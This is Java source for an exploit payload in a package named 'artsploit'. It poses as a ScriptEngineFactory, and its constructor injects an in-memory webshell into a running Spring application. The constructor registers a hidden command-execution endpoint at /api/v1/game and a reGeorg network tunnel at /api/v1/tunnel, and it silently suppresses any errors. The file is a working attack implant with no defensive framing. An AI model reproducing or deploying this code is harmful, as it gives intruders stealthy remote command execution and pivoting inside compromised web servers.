package artsploit;

import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;
import java.lang.reflect.Method;
import java.util.List;

public class AwesomeScriptEngineFactory implements ScriptEngineFactory {
    public AwesomeScriptEngineFactory() {
        try {
            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
            RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);
            // 注册执行命令的shell
            Method method = (Class.forName("artsploit.GameInfo").getDeclaredMethods())[0];
            PatternsRequestCondition url = new PatternsRequestCondition("/api/v1/game");
            RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
            RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
            r.registerMapping(info, Class.forName("artsploit.GameInfo").newInstance(), method);

            // 注册reGeorg tunnel
            Method method1 = (Class.forName("artsploit.Tunnel").getDeclaredMethods())[0];
            PatternsRequestCondition url1 = new PatternsRequestCondition("/api/v1/tunnel");
            RequestMethodsRequestCondition ms1 = new RequestMethodsRequestCondition();
            RequestMappingInfo info1 = new RequestMappingInfo(url1, ms1, null, null, null, null, null);
            r.registerMapping(info1, Class.forName("artsploit.Tunnel").newInstance(), method1);

        } catch (Exception e) {
//            e.printStackTrace();
        }
    }

    public String getEngineName() {
        return null;
    }

    public String getEngineVersion() {
        return null;
    }

    public List<String> getExtensions() {
        return null;
    }

    public List<String> getMimeTypes() {
        return null;
    }

    public List<String> getNames() {
        return null;
    }

    public String getLanguageName() {
        return null;
    }

    public String getLanguageVersion() {
        return null;
    }

    public Object getParameter(String key) {
        return null;
    }

    public String getMethodCallSyntax(String obj, String m, String... args) {
        return null;
    }

    public String getOutputStatement(String toDisplay) {
        return null;
    }

    public String getProgram(String... statements) {
        return null;
    }

    public ScriptEngine getScriptEngine() {
        return null;
    }
}
